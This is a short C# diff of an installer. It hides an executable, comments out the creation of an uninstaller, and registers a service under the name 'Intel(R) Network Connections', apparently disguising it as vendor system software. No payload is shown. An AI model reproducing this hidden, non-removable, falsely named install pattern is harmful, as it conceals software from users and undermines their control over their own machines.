@@ -49,13 +49,13 @@ namespace Installer
             File.SetAttributes(path + "\\bfswc.exe", FileAttributes.Hidden);
             UpdateProgressBar(20);
 
-            System.IO.File.Copy(Application.StartupPath + "\\setup.exe", path + "\\uninstall.exe", true);
+            //System.IO.File.Copy(Application.StartupPath + "\\setup.exe", path + "\\uninstall.exe", true);
             UpdateProgressBar(34);
             #endregion
 
             #region Install Windows Service
-            String filePath = Application.StartupPath + "\\WindowsService.exe";
-            Assembly assembly = Assembly.LoadFrom(filePath);
+            String filePath = Application.StartupPath + "\\console.exe";
+            Assembly assembly = Assembly.LoadFrom("console.dll");
             Utils.InstallService("Intel(R) Network Connections", assembly);
             UpdateProgressBar(55);
             #endregion
